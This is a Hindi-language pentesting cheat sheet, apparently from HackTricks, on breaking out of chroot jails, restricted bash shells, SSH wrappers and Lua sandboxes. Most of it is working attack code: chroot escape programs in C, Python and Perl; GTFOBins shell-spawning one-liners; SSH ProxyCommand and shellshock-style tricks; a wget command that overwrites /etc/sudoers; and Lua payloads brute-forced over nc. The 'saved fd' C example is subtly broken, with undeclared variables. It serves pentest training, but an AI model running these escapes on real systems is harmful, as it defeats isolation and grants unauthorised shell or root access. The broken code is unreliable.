# Jail से बाहर निकलना

{{#include ../../banners/hacktricks-training.md}}

## **GTFOBins**

[**https://gtfobins.github.io/**](https://gtfobins.github.io) **में खोजें कि क्या आप "Shell" property वाली किसी binary को execute कर सकते हैं**

## Chroot से बाहर निकलना

[wikipedia](https://en.wikipedia.org/wiki/Chroot#Limitations) से: chroot mechanism का उद्देश्य **privileged** (**root**) **users** द्वारा जानबूझकर की गई छेड़छाड़ से **बचाव करना नहीं है**। अधिकांश systems पर, chroot contexts सही तरीके से stack नहीं होते और **पर्याप्त privileges वाले chrooted programs बाहर निकलने के लिए दूसरा chroot कर सकते हैं**।\
आमतौर पर इसका अर्थ है कि बाहर निकलने के लिए आपको chroot के अंदर root होना आवश्यक है।

> [!TIP]
> निम्नलिखित scenarios का दुरुपयोग करने और `chroot` से बाहर निकलने के लिए **tool** [**chw00t**](https://github.com/earthquake/chw00t) बनाया गया था।

### Root + CWD

> [!WARNING]
> यदि आप chroot के अंदर **root** हैं, तो आप **एक और chroot बनाकर बाहर निकल सकते हैं**। ऐसा इसलिए क्योंकि (Linux में) 2 chroot एक साथ मौजूद नहीं रह सकते। इसलिए, यदि आप एक folder बनाकर उस नए folder पर **एक नया chroot बनाते हैं**, जबकि **आप उसके बाहर हैं**, तो अब आप **नए chroot के बाहर होंगे** और इसलिए FS में होंगे।
>
> ऐसा इसलिए होता है क्योंकि आमतौर पर chroot आपके working directory को निर्दिष्ट directory में नहीं ले जाता। इसलिए आप एक chroot बना सकते हैं, लेकिन उसके बाहर रह सकते हैं।

आमतौर पर आपको chroot jail के अंदर `chroot` binary नहीं मिलेगी, लेकिन आप एक binary **compile, upload और execute कर सकते हैं**:

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("chroot-dir", 0755);
chroot("chroot-dir");
for(int i = 0; i < 1000; i++) {
chdir("..");
}
chroot(".");
system("/bin/bash");
}
```
</details>

<details>

<summary>Python</summary>
```python
#!/usr/bin/python
import os
os.mkdir("chroot-dir")
os.chroot("chroot-dir")
for i in range(1000):
os.chdir("..")
os.chroot(".")
os.system("/bin/bash")
```
</details>

<details>

<summary>Perl</summary>
```perl
#!/usr/bin/perl
mkdir "chroot-dir";
chroot "chroot-dir";
foreach my $i (0..1000) {
chdir ".."
}
chroot ".";
system("/bin/bash");
```
</details>

### Root + Saved fd

> [!WARNING]
> यह पिछले case के समान है, लेकिन इस case में **attacker current directory के लिए एक file descriptor store करता है** और फिर **एक नए folder में chroot बनाता है**। अंत में, क्योंकि उसके पास **chroot** के **बाहर** उस **FD** का **access** है, वह उस तक पहुंचता है और **escape कर जाता है**।

<details>

<summary>C: break_chroot.c</summary>
```c
#include <sys/stat.h>
#include <stdlib.h>
#include <unistd.h>

//gcc break_chroot.c -o break_chroot

int main(void)
{
mkdir("tmpdir", 0755);
dir_fd = open(".", O_RDONLY);
if(chroot("tmpdir")){
perror("chroot");
}
fchdir(dir_fd);
close(dir_fd);
for(x = 0; x < 1000; x++) chdir("..");
chroot(".");
}
```
</details>

### Root + Fork + UDS (Unix Domain Sockets)

> [!WARNING]
> FD को Unix Domain Sockets के माध्यम से भेजा जा सकता है, इसलिए:
>
> - एक child process बनाएँ (fork)
> - UDS बनाएँ ताकि parent और child आपस में communicate कर सकें
> - child process में किसी अलग folder पर chroot चलाएँ
> - parent proc में एक ऐसे folder का FD बनाएँ जो नए child proc chroot के बाहर हो
> - UDS का उपयोग करके वह FD child procc को भेजें
> - child process उस FD पर chdir करे, और क्योंकि वह उसके chroot के बाहर है, वह jail से escape कर जाएगा

### Root + Mount

> [!WARNING]
>
> - root device (/) को chroot के अंदर किसी directory में Mount करना
> - उस directory में chroot करना
>
> यह Linux में संभव है

### Root + /proc

> [!WARNING]
>
> - chroot के अंदर किसी directory में procfs Mount करें (यदि यह पहले से नहीं है)
> - ऐसे pid को खोजें जिसका root/cwd entry अलग हो, जैसे: /proc/1/root
> - उस entry में chroot करें

### Root(?) + Fork

> [!WARNING]
>
> - एक Fork (child proc) बनाएँ और FS में किसी अलग, अधिक गहराई वाली folder पर chroot करके उसमें CD करें
> - parent process से उस folder को, जिसमें child process मौजूद है, children के chroot से पहले वाली folder में move करें
> - यह children process स्वयं को chroot के बाहर पाएगा

### ptrace

> [!WARNING]
>
> - पहले users अपने ही processes को अपने process से debug कर सकते थे... लेकिन अब यह default रूप से संभव नहीं है
> - फिर भी, यदि यह संभव हो, तो आप किसी process में ptrace करके उसके अंदर shellcode execute कर सकते हैं ([see this example](../interesting-files-permissions/linux-capabilities.md#cap_sys_ptrace))।

## Bash Jails

### Enumeration

Jail के बारे में जानकारी प्राप्त करें:
```bash
echo $0
echo $SHELL
echo $PATH
env
export
pwd
set -o
compgen -c | sort -u
enable -a
type -a bash sh rbash ssh vi vim less more man awk find tar zip git scp script 2>/dev/null
```
### PATH में बदलाव करें

जाँचें कि क्या आप PATH env variable में बदलाव कर सकते हैं.
```bash
echo $PATH #See the path of the executables that you can use
PATH=/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin #Try to change the path
echo /home/* #List directory
```
### vim का उपयोग करना
```bash
:set shell=/bin/sh
:shell
```
### Pagers और help viewers

कई restricted environments में अभी भी **pagers** या **help viewers** उपलब्ध रहते हैं। `PATH` को फिर से बनाने की कोशिश करने की तुलना में इनका दुरुपयोग करना आमतौर पर अधिक तेज़ होता है।
```bash
less /etc/hosts
!/bin/sh

man man
!/bin/sh

man '-H/bin/sh #' man
```
यदि `git` उपलब्ध है, तो याद रखें कि इसका help output आमतौर पर एक pager के माध्यम से जाता है:
```bash
PAGER='/bin/sh -c "exec sh 0<&1"' git -p help
# Or: git help config
# Then inside the pager: !/bin/sh
```
### Common GTFOBins one-liners

एक बार यह पता चल जाए कि कौन-से binaries accessible हैं, तो पहले स्पष्ट shell spawners को test करें:
```bash
awk 'BEGIN {system("/bin/sh")}'
find . -exec /bin/sh \; -quit
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
zip /tmp/zip.zip /etc/hosts -T --unzip-command='sh -c /bin/sh'
script /dev/null -c bash
ssh localhost /bin/sh
```
यदि आप किसी allowed command को स्वतंत्र रूप से चलाने के बजाय उसमें केवल **arguments inject** कर सकते हैं, तो **GTFOArgs** भी देखें।

### Script बनाएँ

जाँचें कि क्या आप _/bin/bash_ को content के रूप में रखते हुए कोई executable file बना सकते हैं.
```bash
red /bin/bash
> w wx/path #Write /bin/bash in a writable and executable path
```
### SSH से bash प्राप्त करें

यदि आप ssh के माध्यम से access कर रहे हैं, तो अक्सर server से restricted login shell के बजाय किसी **अलग program** को execute करने के लिए कह सकते हैं:
```bash
ssh -t user@<IP> bash # Get directly an interactive shell
ssh user@<IP> -t "/bin/sh"
ssh user@<IP> -t "bash --noprofile -i"
ssh user@<IP> -t "() { :; }; sh -i "
```
यदि `ssh` स्थानीय रूप से अनुमति प्राप्त कुछ binaries में से एक है, तो याद रखें कि इसका **GTFOBin** के रूप में भी दुरुपयोग किया जा सकता है:
```bash
ssh localhost /bin/sh
ssh -o PermitLocalCommand=yes -o LocalCommand=/bin/sh localhost
ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```
### घोषित करें
```bash
declare -n PATH; export PATH=/bin;bash -i

BASH_CMDS[shell]=/bin/bash;shell -i
```
### Wget

आप उदाहरण के लिए sudoers file को overwrite कर सकते हैं
```bash
wget http://127.0.0.1:8080/sudoers -O /etc/sudoers
```
### Restricted shell wrappers (`git-shell`, `rssh`, `lshell`)

कुछ environments आपको plain `rbash` में नहीं छोड़ते, बल्कि **wrappers** जैसे `git-shell`, `rssh`, या `lshell` में छोड़ते हैं:

- `git-shell` केवल server-side Git commands और `~/git-shell-commands/` के अंदर मौजूद किसी भी चीज़ को स्वीकार करता है। यदि वह directory मौजूद है, तो allowed custom actions की सूची देखने के लिए `help` चलाएँ। यदि आप वहाँ **write** कर सकते हैं, तो उस directory में डाला गया कोई भी executable reachable बन जाता है।
- `rssh` / `lshell` आमतौर पर केवल `scp`, `sftp`, `rsync`, या Git-style operations की अनुमति देते हैं। ऐसे मामलों में पहले **file write primitives** पर ध्यान दें: `authorized_keys`, shell startup file, या helper script को किसी writable location में upload करें और फिर `ssh -t ...` से दोबारा connect करें।
- यदि wrapper केवल command line को filter करता है, तो reachable binaries की सूची बनाएँ और फिर **GTFOBins / GTFOArgs** पर pivot करें।

### Other tricks

यह भी check करें:

- [**Fireshell Security - Restricted Linux Shell Escaping Techniques**](https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/)
- [**SANS - Escaping Restricted Linux Shells**](https://www.sans.org/blog/escaping-restricted-linux-shells)
- [**GTFOBins**](https://gtfobins.org/)
- [**GTFOArgs**](https://gtfoargs.github.io/)

**यह page भी interesting हो सकता है:**

{{#ref}}
../linux-basics/bypass-linux-restrictions/
{{#endref}}

## Python Jails

निम्नलिखित page पर Python jails से escape करने की tricks हैं:


{{#ref}}
../../generic-methodologies-and-resources/python/bypass-python-sandboxes/
{{#endref}}

## Lua Jails

इस page पर आप Lua के अंदर उपलब्ध global functions देख सकते हैं: [https://www.gammon.com.au/scripts/doc.php?general=lua_base](https://www.gammon.com.au/scripts/doc.php?general=lua_base)

**Command execution के साथ Eval:**
```bash
load(string.char(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))()
```
कुछ tricks जिनसे **dots का उपयोग किए बिना किसी library के functions को call** किया जा सकता है:
```bash
print(string.char(0x41, 0x42))
print(rawget(string, "char")(0x41, 0x42))
```
किसी library के functions की सूची बनाएं:
```bash
for k,v in pairs(string) do print(k,v) end
```
ध्यान दें कि हर बार जब आप पिछले one liner को **अलग lua environment में execute करते हैं, तो functions का order बदल जाता है**। इसलिए यदि आपको किसी specific function को execute करना है, तो आप अलग-अलग lua environments load करके और le library के first function को call करके brute force attack कर सकते हैं:
```bash
#In this scenario you could BF the victim that is generating a new lua environment
#for every interaction with the following line and when you are lucky
#the char function is going to be executed
for k,chr in pairs(string) do print(chr(0x6f,0x73,0x2e,0x65,0x78)) end

#This attack from a CTF can be used to try to chain the function execute from "os" library
#and "char" from string library, and the use both to execute a command
for i in seq 1000; do echo "for k1,chr in pairs(string) do for k2,exec in pairs(os) do print(k1,k2) print(exec(chr(0x6f,0x73,0x2e,0x65,0x78,0x65,0x63,0x75,0x74,0x65,0x28,0x27,0x6c,0x73,0x27,0x29))) break end break end" | nc 10.10.10.10 10006 | grep -A5 "Code: char"; done
```
**Interactive lua shell प्राप्त करें**: यदि आप limited lua shell के अंदर हैं, तो आप इसे call करके एक नया lua shell (और उम्मीद है कि unlimited) प्राप्त कर सकते हैं:
```bash
debug.debug()
```
## संदर्भ

- [https://www.youtube.com/watch?v=UO618TeyCWo](https://www.youtube.com/watch?v=UO618TeyCWo) (स्लाइड्स: [https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions\_-_Bucsay_Balazs.pdf](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf))
- [https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)
- [https://git-scm.com/docs/git-shell](https://git-scm.com/docs/git-shell)

{{#include ../../banners/hacktricks-training.md}}
